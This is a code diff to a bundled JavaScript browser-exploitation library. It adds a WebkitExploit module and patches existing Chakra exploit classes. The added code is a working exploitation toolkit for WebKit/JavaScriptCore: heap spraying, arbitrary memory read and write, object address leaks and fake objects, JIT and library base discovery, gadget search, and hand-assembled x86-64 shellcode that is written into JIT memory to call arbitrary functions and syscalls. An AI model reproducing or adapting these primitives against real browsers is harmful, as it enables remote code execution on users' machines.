@@ -2052,7 +2052,10 @@ function ChakraExploit() {
                 }
                 var worker = exploit.Uint64Ptr.cast(stk[1]);
                 var manager = exploit.Uint64Ptr.cast(stk[2]);
+                // Set manager's data pointer to worker object
                 manager[7] = worker;
+                // Set flag in worker's data to notify thread to stop spinning
+                exploit.Int32Ptr.cast(worker[7])[0] = 1;
             } else if (this.onmessage) {
                 return this.onmessage(e);
             }
@@ -2355,12 +2358,15 @@ Object.defineProperty(__webpack_exports__, "__esModule", { value: true });
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_1_chakraexploit__ = __webpack_require__(2);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_2_chakrathreadexploit__ = __webpack_require__(4);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_3_chromeexploit__ = __webpack_require__(5);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_4_integer__ = __webpack_require__(0);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_4_webkitexploit__ = __webpack_require__(6);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_5_integer__ = __webpack_require__(0);
 /* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "BaseExploit", function() { return __WEBPACK_IMPORTED_MODULE_0_baseexploit__["a"]; });
 /* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "ChakraExploit", function() { return __WEBPACK_IMPORTED_MODULE_1_chakraexploit__["a"]; });
 /* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "ChakraThreadExploit", function() { return __WEBPACK_IMPORTED_MODULE_2_chakrathreadexploit__["a"]; });
 /* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "ChromeExploit", function() { return __WEBPACK_IMPORTED_MODULE_3_chromeexploit__["a"]; });
-/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "Integer", function() { return __WEBPACK_IMPORTED_MODULE_4_integer__["a"]; });
+/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "WebkitExploit", function() { return __WEBPACK_IMPORTED_MODULE_4_webkitexploit__["a"]; });
+/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "Integer", function() { return __WEBPACK_IMPORTED_MODULE_5_integer__["a"]; });
+
 
 
 
@@ -2398,7 +2404,7 @@ function ChakraThreadExploit() {
     eval('String.prototype.slice').call('', {
         valueOf: function () {
             postMessage('CHAKRA_EXPLOIT');
-            while (dvManager.getInt32(0) == 0) {};
+            while (dvWorker.getInt32(0) == 0) {};
         }
     }, 0, 0, 0, 0, 0x41424344, dvWorker, dvManager, 0x41414141);
     
@@ -2696,6 +2702,370 @@ ChromeExploit.prototype.call = function (address, ...args) {
 }
 
 /* harmony default export */ __webpack_exports__["a"] = (ChromeExploit);
+
+
+/***/ }),
+/* 6 */
+/***/ (function(module, __webpack_exports__, __webpack_require__) {
+
+"use strict";
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_baseexploit__ = __webpack_require__(1);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1_integer__ = __webpack_require__(0);
+
+
+
+/**
+ * Constructs an exploit with sensible defaults for Webkit. Child must call initChrome method with a successfully an object that's successfully misaligned.
+ *
+ * @augments BaseExploit
+ * @class
+ * @constructor
+ */
+function WebkitExploit() {
+    var exploit = this;
+    __WEBPACK_IMPORTED_MODULE_0_baseexploit__["a" /* default */].call(this, 64);
+
+    this.broughtToYouBy = 'Externalist';
+    this.nogc = []
+    this.pressure = new Array(100);
+    this.master = new Uint32Array(0x1000);
+    this.slave = new Uint32Array(0x1000);
+    this.leakval_u32 = new Uint32Array(0x1000);
+    this.leakval_helper = [this.slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+    this.misalign_object = {'a':this.u2d(2048, 0x602300), 'b':this.u2d(0,0), 'c':this.leakval_helper, 'd':this.u2d(0x1337,0)};
+    this.butterfly = 0;
+    this.addr_to_slavebuf = 0;
+
+    function makeid() {
+        var text = "";
+        var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+        for (var i = 0; i < 8; i++)
+            text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+        return text;
+    };
+
+    this.instancespr = [];
+    for (var i = 0; i < 4096; i++) {
+        this.instancespr[i] = new Uint32Array(1);
+        this.instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
+    }
+}
+WebkitExploit.prototype = Object.create(__WEBPACK_IMPORTED_MODULE_0_baseexploit__["a" /* default */].prototype);
+WebkitExploit.prototype.constructor = WebkitExploit;
+
+// In case you want to invoke the Garbage Collector
+WebkitExploit.prototype.dgc = function(){
+    for (var i = 0; i < this.pressure.length; i++) {
+        this.pressure[i] = new Uint32Array(0x10000);
+    }
+}
+
+// Convert Uint64 into an equivalent Floating Point representation
+WebkitExploit.prototype.u2d = function(low, hi) {
+    var _dview = new DataView(new ArrayBuffer(16));
+    _dview.setUint32(0, hi);
+    _dview.setUint32(4, low);
+    return _dview.getFloat64(0);
+}
+
+// The inverse of the above
+WebkitExploit.prototype.d2u = function(d) {
+    var _dview = new DataView(new ArrayBuffer(16));
+    _dview.setFloat64(0, d);
+    return { lo: _dview.getUint32(4), hi: _dview.getUint32(0) };    
+}
+
+// Be careful when using this. Looping intensively could summon the GC
+WebkitExploit.prototype.sleep = function(milliseconds) {
+    var start = new Date().getTime();
+    while (new Date().getTime() < start + milliseconds);
+}
+
+/**
+ * Initializes Webkit helpers using memory read and write.
+ *
+ * @param {Integer|Pointer} fake_object A successfully misaligned object
+ */
+WebkitExploit.prototype.initWebkit = function(fake_object) {
+    this.misalign_object.c = this.leakval_helper;
+    this.butterfly = new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](fake_object[2], fake_object[3], true);
+
+    this.misalign_object.c = this.leakval_u32;
+    var lkv_u32_old = new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](fake_object[4], fake_object[5], true);
+    fake_object[4] = this.butterfly.low;
+    fake_object[5] = this.butterfly.high;
+
+    this.misalign_object.c = this.master;
+    fake_object[4] = this.leakval_u32[0];
+    fake_object[5] = this.leakval_u32[1];
+
+    this.addr_to_slavebuf = new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](this.master[4], this.master[5], true);
+    this.misalign_object.c = this.leakval_u32;
+    fake_object[4] = lkv_u32_old.low;
+    fake_object[5] = lkv_u32_old.high;
+
+    // Don't let GC ruin the party :)
+    fake_object = 0;
+    this.misalign_object.c = 0;
+
+    // Get the JIT code address from a function object
+    var trycatch = "";
+    for(var z=0; z<0x2000; z++) trycatch += "try{} catch(e){}; ";
+    this.fc = new Function(trycatch);
+    for(var z=0; z<1000; z++) {         // Don't loop too excessively, otherwise FTL will kick in and wipe out the address from the object and start to hardcode call destinations
+        this.fc();
+    }
+    this.jitCode = this.Uint8Ptr.cast(this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOf(this.fc))[3])[3])[2]);     // These indexs may change slightly from version to version. I remember one being 3-2-2 on a different version. It'd be better to implement a hueristic logic but whatever... :D
+
+    // Get the JavaScriptCore library base address. I could have gone further all the way down to the dyld_shared_cache base but 'shared_region_check_np' has got me covered so I stop here :)
+    var parseFloatAddress = this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOf(parseFloat))[3])[7].and(new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](0xFFF, 0, true).not());
+    while(this.read(parseFloatAddress, 32) != 0xfeedfacf) {
+        parseFloatAddress = parseFloatAddress.sub(0x1000);
+    }
+    this.javaScriptCoreBase = parseFloatAddress;
+
+    var gadgets = [
+        ['return', [ 0xC3 ]],
+        // ['syscallReturn', [ 0x0F, 0x05, 0xC3 ]]      // Couldn't find this or anything similar in JavaScriptCore
+    ];
+    this.gadgets = this.findGadgetsCustom(this.javaScriptCoreBase, gadgets);
+}
+
+// The findGadgets in the baseexploit.js only works for PE files. Therefore I reimplement it here(just a mere 3 line change). I didn't really want to touch the already well functioning basicexploit.js
+WebkitExploit.prototype.findGadgetsCustom = function (module, query) {
+    var p = this.Uint8Ptr.cast(module);
+    var codeSize = 0x10000;     // Just hardcoded this into 0x10000 for now. We'd have to parse the mach-o header and walk each segment load command to get the text section addr & size but I was too sleepy at the moment
+    var array = new Int32Array(codeSize / 4);
+    var address = p.address.add(0x1000);
+    for (var i = 0x1000; i < codeSize; i += 8) {
+        var x = this.read(address, 64);
+        array[i / 4] = x.low;
+        array[i / 4 + 1] = x.high;
+        address.low += 8;
+        if ((address.low|0) == 0) {
+            address.high += 1;
+        }
+    }
+
+    var byteArray = new Uint8Array(array.buffer);
+    var gadgets = {};
+    query.forEach((gadget) => {
+        var name = gadget[0], bytes = gadget[1];
+        var idx = 0;
+        while (true) {
+            idx = byteArray.indexOf(bytes[0], idx);
+            if (idx < 0) {
+                throw 'missing gadget ' + name;
+            }
+            for (var j = 1; j < bytes.length; j++) {
+                if (bytes[j] >= 0 && byteArray[idx + j] != bytes[j]) {
+                    break;
+                }
+            }
+            if (j == bytes.length) {
+                break;
+            }
+            idx++;
+        }
+        gadgets[name] = p.add(idx);
+    });
+    return gadgets;
+}
+
+// The arbitrary read function
+WebkitExploit.prototype.read = function (address, size) {
+    this.master[4] = address.low;
+    this.master[5] = address.high;
+
+    var rtv = new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](this.slave[0], this.slave[1], true, size);
+
+    this.master[4] = this.addr_to_slavebuf.low;
+    this.master[5] = this.addr_to_slavebuf.high;
+
+    return rtv;
+}
+
+// The arbitrary write function
+WebkitExploit.prototype.write = function (address, value, size) {
+    this.master[4] = address.low;
+    this.master[5] = address.high;
+
+    switch (size) {
+        case 8 : this.slave[0] = (this.slave[0] & 0xFFFFFF00) +  (value.low & 0xFF);
+        case 16: this.slave[0] = (this.slave[0] & 0xFFFF0000) +  (value.low & 0xFFFF);
+        case 32: this.slave[0] = value.low | 0;
+        case 64: this.slave[0] = value.low; 
+                 this.slave[1] = value.high;
+    }
+
+    this.master[4] = this.addr_to_slavebuf.low;
+    this.master[5] = this.addr_to_slavebuf.high;
+}
+
+/**
+ * Returns the address of a Javascript object.
+ *
+ * @param {*} obj Any Javascript object
+ * @returns {Pointer}
+ */
+WebkitExploit.prototype.addressOf = function (obj) {
+    this.leakval_helper[0] = obj;
+    var rtv = this.read(this.butterfly, 64);
+    this.write(this.butterfly, new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](0x41414141, 0xffff0000, true), 64);
+
+    return rtv;
+}
+
+/**
+ * Creates a fake Javascript object that lies in the address 'fakeObjectAddr'
+ *
+ * @param {*} fakeObjectAddr Address of a fake Javascript object
+ * @returns {JSObject}
+ */
+WebkitExploit.prototype.createFakeObject = function (fakeObjectAddr) {
+    this.write(this.butterfly, fakeObjectAddr);
+    var rt = this.leakval_helper[0];
+    this.write(this.butterfly, new int64(0x41414141, 0xffff0000, true));
+    return rt;
+}
+
+/**
+ * Returns the address of ArrayBuffer contents.
+ *
+ * @param {ArrayBuffer} ab ArrayBuffer
+ * @returns {Pointer}
+ */
+WebkitExploit.prototype.addressOfArrayBuffer = function (ab) {
+    var p = this.Uint64Ptr.cast(this.addressOf(ab));
+    return p[2];
+}
+
+// Not really needed as of now. Just leaving an empty function here in case a need rises in the future
+/**
+ * Returns the address of a Javascript object. Internal.
+ *
+ * @param {*} obj Any Javascript object
+ * @returns {Pointer}
+ */
+WebkitExploit.prototype.addressOfSlow = function (obj) {
+
+}
+
+// Fow now, the max cap of argument counts is 6.
+/**
+ * Call a function pointer with the given arguments. Used internally by FunctionPointer.
+ *
+ * @param {Integer} address
+ * @param {...Integer} args
+ * @returns {Integer}
+ */
+WebkitExploit.prototype.call = function (address, ...args) {
+    var slack_space_size = 0x1000;
+    var syscall_number_opcode = [], call_opcode = [];
+
+    if(address.syscallNumber == null){
+        call_opcode = [
+            0x48, 0xBB, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,     // mov rbx, [marker]
+            0xFF, 0xD3                                                      // call rbx
+        ];
+    }
+    else{
+        syscall_number_opcode = [ 0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00 ];
+        syscall_number_opcode[3] = ((address.syscallNumber & 0x000000FF) >> 0) & 0xFF;
+        syscall_number_opcode[4] = ((address.syscallNumber & 0x0000FF00) >> 8) & 0xFF;
+        syscall_number_opcode[5] = ((address.syscallNumber & 0x00FF0000) >> 16) & 0xFF;
+        syscall_number_opcode[6] = ((address.syscallNumber & 0xFF000000) >> 24) & 0xFF;
+        call_opcode = [ 0x0F, 0x05 ];                                // syscall
+    }
+
+    var buf_jmp = new Uint8Array(syscall_number_opcode.concat([
+        // 0xCC,     // Test breakpoint
+        0x55,                                       // push rbp
+        0x48, 0x89, 0xE5,                           // mov rbp, rsp
+        0x48, 0x83, 0xEC, 0x20,                     // sub rsp,0x20
+        0xE8, 0x00, 0x00, 0x00, 0x00                // call {after slack_space} - Don't edit the opcodes of this line. It'll break the search logic shortly after
+        ]));
+    var buf_filler = new Uint8Array(slack_space_size);
+    var buf_setup_args = new Uint8Array([
+        0x5B,                                       // pop rbx
+        0x53,                                       // push rbx
+        0x48, 0x8B, 0x3B,                           // mov rdi, qword ptr [rbx]
+        0x48, 0x8B, 0x73, 0x08,                     // mov rsi, qword ptr [rbx+8]
+        0x48, 0x8B, 0x53, 0x10,                     // mov rdx, qword ptr [rbx+0x10]
+        0x48, 0x8B, 0x4B, 0x18,                     // mov rcx, qword ptr [rbx+0x18]
+        0x4C, 0x8B, 0x43, 0x20,                     // mov r8, qword ptr [rbx+0x20]
+        0x4C, 0x8B, 0x4B, 0x28                      // mov r9, qword ptr [rbx+0x28]
+        ].concat(call_opcode).concat([
+        0x5B,                                       // pop rbx
+        0x48, 0x89, 0x03,                           // mov QWORD PTR [rbx],rax
+        0xC9,                                       // leave
+        0xC3                                        // ret
+        ]));
+
+    // set up the call destination address
+    for(var i=0; i<buf_jmp.length; i++) {
+        if(buf_jmp[i] == 0xE8 && buf_jmp[i+1] == 0 && buf_jmp[i+2] == 0 && buf_jmp[i+3] == 0 && buf_jmp[i+4] == 0) {
+            this.Uint32Ptr.cast(this.addressOfArrayBuffer(buf_jmp).add(i+1))[0] = slack_space_size;
+            break;
+        }
+    }
+
+    var argumentBufAddress = this.Uint64Ptr.cast(this.addressOfArrayBuffer(buf_filler));
+    for(var i=0; i<6; i++) {
+        if(i < args.length) {
+            argumentBufAddress[i] = args[i];
+        }
+    }
+
+    if(address.syscallNumber == null) {
+        for(var i=0; i<buf_setup_args.length; i++) {
+            if( buf_setup_args[i] == 0x48 && buf_setup_args[i+1] == 0xBB &&
+                buf_setup_args[i+2] == 0x41 && buf_setup_args[i+3] == 0x42 && buf_setup_args[i+4] == 0x43 && buf_setup_args[i+5] == 0x44 &&
+                buf_setup_args[i+6] == 0x45 && buf_setup_args[i+7] == 0x46 && buf_setup_args[i+8] == 0x47 && buf_setup_args[i+9] == 0x48 ) {
+                this.Uint64Ptr.cast(this.addressOfArrayBuffer(buf_setup_args).add(i+2))[0] = address;
+                break;
+            }
+        }
+    }
+
+    var shc = new Uint8Array(buf_jmp.length + buf_filler.length + buf_setup_args.length);
+    shc.set(buf_jmp);
+    shc.set(buf_filler, buf_jmp.length);
+    shc.set(buf_setup_args, buf_jmp.length + buf_filler.length);
+
+    this.writeAndCallJIT(shc);
+
+    return this.Uint64Ptr.cast(this.Uint8Ptr.cast(this.jitCode).add(buf_jmp.length))[0];
+}
+
+/**
+ * Call a syscall with the given arguments.
+ *
+ * @param {SMI} syscallNumber
+ * @param {...Integer} args
+ * @returns {Integer}
+ */
+WebkitExploit.prototype.syscall = function (syscallNumber, ...args) {
+    var address = new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](0, 0, true);
+    address.syscallNumber = syscallNumber + 0x2000000;
+    return this.call(address, ...args);
+}
+
+/**
+ * Writes shellcode onto the JIT and call into it
+ *
+ * @param {JSArray} shellcode
+ */
+WebkitExploit.prototype.writeAndCallJIT = function (shellcode) {
+    for(var i=0; i<shellcode.length; i++){
+        this.jitCode[i] = shellcode[i];
+    }
+    this.fc();
+}
+
+/* harmony default export */ __webpack_exports__["a"] = (WebkitExploit);
 
 
 /***/ })
